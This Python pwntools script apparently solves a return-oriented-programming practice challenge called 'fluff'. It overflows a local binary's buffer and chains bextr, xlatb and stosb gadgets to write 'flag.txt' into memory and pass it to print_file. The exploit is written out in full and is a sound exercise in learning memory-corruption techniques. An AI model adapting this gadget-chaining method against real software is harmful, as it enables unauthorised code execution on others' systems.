#!/usr/bin/env python3

from pwn import *

pwn = './fluff'
buffer = 40
gdbscript = '''
b * pwnme + 152
continue
'''

def conn():

	if args.GDB:
		return gdb.debug(pwn,gdbscript=gdbscript)
	else:
		return process(pwn)

io = conn()			
io.recvuntil(b'> ')
f = open('input','wb')

#bextr: rbx, rcx[rdx[0:7] : rdx[8:15]] ==> prawie jak pop rbx
#xlat : al, BYTE PTR [rbx + al]
#stos : BYTE PTR [rdi], al
PRINT_FILE = 0x400510
RCX_ADDEND = 0x3ef2
str_ptr = 0x601180
POP_ALL = 0x40069c
POP_RDI = 0x4006a3
POP_RDX_RCX_BEXTR_RBX_RCX_RDX = 0x000000000040062a
STOSB = 0x400639
XLAT = 0x400628

f_char   = 0x4003c4
l_char   = 0x600239
a_char   = 0x60040c
g_char   = 0x6003cf
dot_char = 0x60024e
t_char   = 0x60040b
x_char   = 0x600246



payload = b''
#f al = 0xb
payload += p64(POP_RDX_RCX_BEXTR_RBX_RCX_RDX) + p64(0xff00) + p64(f_char - RCX_ADDEND - 0xb) + p64(XLAT)
payload += p64(POP_RDI) + p64(str_ptr) + p64(STOSB)
#l al = 0x66
payload += p64(POP_RDX_RCX_BEXTR_RBX_RCX_RDX) + p64(0xff00) + p64(l_char - RCX_ADDEND - 0x66) + p64(XLAT)
payload += p64(POP_RDI) + p64(str_ptr + 1) + p64(STOSB)
#a al = 0x6c
payload += p64(POP_RDX_RCX_BEXTR_RBX_RCX_RDX) + p64(0xff00) + p64(a_char - RCX_ADDEND - 0x6c) + p64(XLAT)
payload += p64(POP_RDI) + p64(str_ptr + 2) + p64(STOSB)
#g al = 0x61
payload += p64(POP_RDX_RCX_BEXTR_RBX_RCX_RDX) + p64(0xff00) + p64(g_char - RCX_ADDEND - 0x61) + p64(XLAT)
payload += p64(POP_RDI) + p64(str_ptr + 3) + p64(STOSB)
#. al = 0x67
payload += p64(POP_RDX_RCX_BEXTR_RBX_RCX_RDX) + p64(0xff00) + p64(dot_char - RCX_ADDEND - 0x67) + p64(XLAT)
payload += p64(POP_RDI) + p64(str_ptr + 4) + p64(STOSB)
#t al = 0x2e
payload += p64(POP_RDX_RCX_BEXTR_RBX_RCX_RDX) + p64(0xff00) + p64(t_char - RCX_ADDEND - 0x2e) + p64(XLAT)
payload += p64(POP_RDI) + p64(str_ptr + 5) + p64(STOSB)
#x al = 0x74
payload += p64(POP_RDX_RCX_BEXTR_RBX_RCX_RDX) + p64(0xff00) + p64(x_char - RCX_ADDEND - 0x74) + p64(XLAT)
payload += p64(POP_RDI) + p64(str_ptr + 6) + p64(STOSB)
#t al = 0x78
payload += p64(POP_RDX_RCX_BEXTR_RBX_RCX_RDX) + p64(0xff00) + p64(t_char - RCX_ADDEND - 0x78) + p64(XLAT)
payload += p64(POP_RDI) + p64(str_ptr + 7) + p64(STOSB)

payload += p64(POP_RDI) + p64(str_ptr) + p64(PRINT_FILE)


f.write(b'A'*buffer + payload)
io.sendline(b'A'*buffer + payload)
io.interactive()